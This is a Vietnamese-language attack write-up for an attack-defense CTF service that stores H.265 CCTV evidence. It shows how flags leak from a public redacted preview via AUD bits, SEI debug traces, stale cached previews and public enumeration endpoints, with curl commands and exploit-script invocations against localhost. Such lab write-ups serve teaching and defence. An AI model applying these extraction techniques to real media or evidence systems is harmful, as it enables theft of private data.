# H265 Evidence Portal AD - Writeup Attack

## Tổng Quan Lỗi

Service lưu bằng chứng CCTV dưới dạng H.265. File gốc là dữ liệu riêng tư, chỉ ai có
`operator token` mới đọc được qua `/api/read` hoặc `/api/carrier`.

Lỗi nằm ở file xem trước công khai:

```text
/api/cases/<case_id>/redacted-preview.h265
```

Backend tạo file này bằng cách copy nhiều NAL từ file gốc sang preview. Trong H.265,
NAL không chỉ chứa hình ảnh mà còn có dữ liệu phụ. Vì vậy flag/custody marker có thể
bị lộ qua nhiều đường khác nhau.

Mục tiêu của attacker là lấy flag từ các dữ liệu công khai, không cần token.

## Dữ Liệu Cần Có Trước Khi Khai Thác

Hầu hết các hướng đều cần hai thứ:

- `case_id`
- file `redacted-preview.h265`

Lấy danh sách case:

```bash
curl http://127.0.0.1:8000/api/cases
```

Ví dụ response:

```json
{
  "ok": true,
  "items": [
    {
      "id": "flag_1780132060_da66f92c",
      "preview_url": "/api/cases/flag_1780132060_da66f92c/redacted-preview.h265"
    }
  ]
}
```

Tải preview:

```bash
curl -L -o preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
```

Kiểm tra file là H.265:

```bash
ffprobe -v error -show_entries stream=codec_name,width,height -of default=noprint_wrappers=1 preview.h265
```

Kết quả mong đợi:

```text
codec_name=hevc
width=640
height=360
```

Sau khi có `case_id` và preview, bắt đầu thử từng hướng dưới đây.

## Hướng 1 - Lấy Cờ Qua AUD NAL

### Khi nào dùng được?

Dùng hướng này khi preview còn AUD NAL type `35`.

Kiểm tra:

```bash
python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('preview.h265').read_bytes(); print(sum(1 for n in find_nals(data) if nal_type(n)==35))"
```

Nếu số in ra lớn hơn `0`, có thể thử hướng AUD.

### Vì sao lấy được cờ?

Service giấu bit vào AUD. Với mỗi AUD, bit được lấy từ:

```python
primary_pic_type = (nal[2] >> 5) & 0x07
bit = primary_pic_type & 1
```

Flag được đóng gói thành:

```text
H5AD || độ dài 2 byte || flag || crc32(flag)
```

Trước khi ghi vào AUD, service xử lý thêm:

```text
packet -> bit -> XOR theo case_id -> mã Manchester -> chèn AUD giả
```

Vì `case_id` bị lộ qua `/api/cases`, attacker có thể sinh lại nhịp AUD giả và mặt nạ XOR
để giải ngược.

### Cách khai thác thủ công

1. Tách các NAL trong `preview.h265`.
2. Lọc NAL type `35`.
3. Lấy `primary_pic_type & 1` từ từng AUD.
4. Dùng `case_id` để bỏ AUD giả.
5. Giải mã Manchester.
6. XOR ngược bằng `case_id`.
7. Tìm packet bắt đầu bằng `H5AD`.
8. Đọc độ dài flag.
9. Kiểm tra `crc32`.
10. In ra flag.

### Lệnh khai thác

```bash
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector aud
```

Kết quả thành công:

```text
blockChainPTIT{...}
```

### Nếu thất bại thì hiểu sao?

- Không còn AUD: defender đã xóa AUD khỏi preview.
- CRC sai: bit lấy ra bị thiếu hoặc sai `case_id`.
- Không thấy `H5AD`: dữ liệu trong AUD không còn là marker hợp lệ.

Khi hướng AUD thất bại, chuyển sang hướng SEI.

## Hướng 2 - Lấy Cờ Qua SEI NAL

### Khi nào dùng được?

Dùng hướng này khi preview còn SEI NAL type `39` hoặc `40`.

Kiểm tra:

```bash
python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('preview.h265').read_bytes(); print({t:sum(1 for n in find_nals(data) if nal_type(n)==t) for t in (39,40)})"
```

Nếu type `39` hoặc `40` lớn hơn `0`, có thể thử hướng SEI.

### Vì sao lấy được cờ?

Trong bài này SEI chứa dấu vết gỡ lỗi dạng:

```text
H5DBG || độ dài 2 byte || packet đã XOR
```

`packet đã XOR` thực chất là packet chứa flag, nhưng bị XOR bằng dòng byte sinh từ
`case_id`.

Nhãn sinh khóa:

```text
h265-ad-sei-trace:
```

Vì attacker biết `case_id`, attacker có thể tạo lại dòng byte đó và XOR ngược.

### Cách khai thác thủ công

1. Tách NAL trong preview.
2. Lọc NAL type `39` và `40`.
3. Bỏ 2 byte header NAL để lấy payload.
4. Tìm chuỗi `H5DBG`.
5. Đọc 2 byte độ dài sau `H5DBG`.
6. Lấy đúng số byte dữ liệu đã XOR.
7. Sinh dòng byte bằng `SHA256("h265-ad-sei-trace:" || case_id || counter)`.
8. XOR ngược để lấy packet thật.
9. Parse packet `H5AD`.
10. Kiểm tra `crc32`.
11. In ra flag.

### Lệnh khai thác

```bash
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector sei
```

Kết quả thành công:

```text
blockChainPTIT{...}
```

### Khi nào hướng này đặc biệt hữu ích?

Khi đội phòng thủ chỉ vá theo kiểu:

```text
strip AUD type 35
```

Lúc đó hướng AUD fail, nhưng SEI vẫn còn trong preview. Đây là ví dụ điển hình của việc
defender vá một dấu hiệu cụ thể nhưng chưa vá lỗi tổng quát.

## Hướng 3 - Lấy Cờ Từ Preview Cache Cũ

### Khi nào dùng được?

Dùng hướng này sau khi defender đã vá code nhưng service vẫn còn trả file preview cũ.

Điều kiện:

- Preview lỗi đã từng được render trước khi vá.
- File đó vẫn nằm trong thư mục cache.
- Backend chỉ kiểm tra file tồn tại rồi trả luôn, không kiểm tra phiên bản bộ làm sạch.

### Vì sao lấy được cờ?

Preview cũ là artifact đã sinh bởi code lỗi. Dù source code hiện tại đã vá, file cũ vẫn
có thể chứa AUD/SEI leak.

Luồng lỗi:

```text
trước khi vá: tạo preview lỗi
-> sau khi vá: file lỗi vẫn còn trong cache
-> attacker tải lại preview
-> exploit chạy trên file cũ
```

### Cách khai thác

Tải lại preview:

```bash
curl -L -o stale_preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
```

Kiểm tra file cũ còn AUD/SEI không:

```bash
python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('stale_preview.h265').read_bytes(); print({t:sum(1 for n in find_nals(data) if nal_type(n)==t) for t in (35,39,40)})"
```

Nếu còn `35`, `39` hoặc `40`, tiếp tục chạy exploit:

```bash
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector auto
```

Kết quả thành công:

```text
blockChainPTIT{...}
```

### Điểm quan trọng

Ở hướng này, attacker không cần tìm bug mới trong code. Attacker chỉ tận dụng file public
cũ mà service vẫn đang trả.

## Hướng 4 - Lấy Thông Tin Qua Share Và Manifest

### Khi nào dùng?

Dùng khi `/api/cases` không đủ thông tin hoặc bị ẩn.

Thử các đường dẫn:

```text
/share/<share_id>
/api/share/<share_id>/manifest.json
```

### Có thể lấy được gì?

Các endpoint này có thể cho biết:

- `case_id`
- `preview_url`
- codec
- camera/source
- loại artifact public

### Cách dùng để lấy cờ

1. Mở share hoặc manifest.
2. Lấy `case_id` và `preview_url`.
3. Tải preview.
4. Thử hướng AUD.
5. Nếu AUD thất bại, thử hướng SEI.
6. Nếu cả hai thất bại, kiểm tra preview cache cũ.

Share/manifest thường không trả flag trực tiếp, nhưng giúp tìm đúng file cần khai thác.

## Hướng 5 - Lấy Thông Tin Qua Nhật Ký Và Hàng Đợi Preview

### Khi nào dùng?

Dùng để tìm case mới, case vừa được checker đặt flag hoặc preview vừa render xong.

Thử:

```bash
curl http://127.0.0.1:8000/api/audit
curl http://127.0.0.1:8000/api/preview-jobs
```

### Có thể tận dụng gì?

Nếu public, các endpoint này có thể giúp biết:

- case nào mới được import
- preview nào đã sẵn sàng
- case nào vừa được tải preview
- lúc nào nên tải lại preview

### Cách dùng để lấy cờ

1. Xem audit để tìm `case_imported`.
2. Lấy `case_id` mới.
3. Xem preview job của case đó đã `ready` chưa.
4. Nếu ready, tải preview.
5. Chạy exploit `--vector auto`.

Đây là hướng hỗ trợ chọn mục tiêu. Nó không phải hướng giải mã flag trực tiếp, nhưng giúp
attacker đánh đúng case đang có flag mới.

## Hướng 6 - Kiểm Tra Lỗi Phân Quyền Ở Route Private

### Khi nào dùng?

Luôn nên thử nhanh trước khi phân tích H.265 sâu.

Hai route private:

```text
POST /api/read
POST /api/carrier
```

đáng ra phải yêu cầu token đúng.

### Cách thử

```bash
curl -X POST http://127.0.0.1:8000/api/read ^
  -H "Content-Type: application/json" ^
  -d "{\"id\":\"flag_1780132060_da66f92c\",\"token\":\"wrong-token\"}"
```

Kết quả đúng là bị từ chối.

### Nếu lấy được cờ thì sao?

Nếu token sai mà server vẫn trả marker, đó là lỗi phân quyền trực tiếp. Khi đó không cần
khai thác AUD/SEI nữa.

Trong bản hiện tại, route private làm đúng. Vì vậy hướng chính vẫn là preview public.

## Khai Thác Tự Động

Nếu đã có `case_id`:

```bash
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector auto
```

Nếu chưa có `case_id`:

```bash
python solution/exploit.py http://127.0.0.1:8000 --vector auto
```

Chạy riêng từng hướng:

```bash
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector aud
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector sei
```

Cách đọc kết quả:

- `aud` thành công: preview còn AUD leak.
- `aud` thất bại, `sei` thành công: defender chỉ vá AUD.
- Cả hai thất bại nhưng file cũ còn AUD/SEI: vấn đề nằm ở cache.
- Cả hai thất bại và preview không còn AUD/SEI: đường preview đã được vá khá tốt.

## Kết Luận

Tất cả hướng tấn công đều xoay quanh một câu hỏi:

```text
Preview công khai còn giữ dữ liệu gì từ file gốc riêng tư?
```

Nếu preview còn AUD, SEI, dấu vết gỡ lỗi, cache cũ hoặc endpoint public giúp tìm đúng
artifact, attacker vẫn có thể tiếp tục tìm cách lấy flag.
